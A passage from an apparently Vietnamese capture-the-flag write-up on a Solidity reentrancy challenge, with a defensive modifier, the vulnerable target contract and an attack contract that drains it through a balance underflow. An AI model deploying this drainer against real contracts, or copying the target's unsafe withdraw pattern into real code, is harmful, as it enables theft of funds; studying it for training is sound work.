### Kết luận:
- Lỗ hổng: xuất phát từ việc gửi Ether trước khi cập nhật trạng thái nội bộ, cho phép attacker gọi lại hàm một cách lặp lại và rút hết tiền trong contract mục tiêu.
- Cách phòng tránh: có thể cập nhật trạng thái trước, sử dụng khóa nonReentrant, và hạn chế gas khi chuyển tiền.
- VD modifier noReentrant (có thể thêm require số dư mới của người dùng thì mới được chuyển tiếp).
```solidity
    bool private locked = false;
    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }

```
### Contract tấn công
```solidity
// SPDX-License-Identifier: MIT
import './reentrance.sol';
pragma solidity ^0.8.0;
interface IReentrance{
    function balances(address) external returns (uint256);
    function donate(address _to) external payable;
    function balanceOf(address _who) external view returns(uint256 balance);
    function withdraw(uint256 _amount) external;
}
contract ReentranceAttack{
    IReentrance victim;
    constructor(address payable challenge){
        victim = IReentrance(challenge);
    } 
    function attack_1_donateandwithdraw() public { // Cause overflow
        victim.donate{value: 1}(address(this));
        victim.withdraw(1);
    }
    function attack_2_reWithdraw() public{
        victim.withdraw(1); // Goi lai ham de tiep tuc tan cong cho den khi contract can tien.
    }
}
```
### Contract
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
```
